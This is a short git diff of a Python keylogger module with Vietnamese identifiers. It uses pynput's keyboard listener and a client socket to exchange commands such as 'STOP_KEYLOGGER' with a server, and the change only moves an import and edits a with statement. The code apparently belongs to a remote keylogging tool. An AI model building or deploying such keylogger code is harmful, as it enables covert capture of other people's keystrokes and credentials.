@@ -1,5 +1,5 @@
 from pynput import keyboard
-from General.KetNoi_GiaoTiep import send_command, receive_response
+from XL_Chucnang.Connection import send_command, receive_response
 
 
 # Biến trạng thái keylogger
@@ -18,7 +18,7 @@ def key_logger(client_socket):
             send_command(client_socket, "STOP_KEYLOGGER")            
             return False  
         
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=on_press):
         try:
             while True:
                 # Nhận dữ liệu từ server                
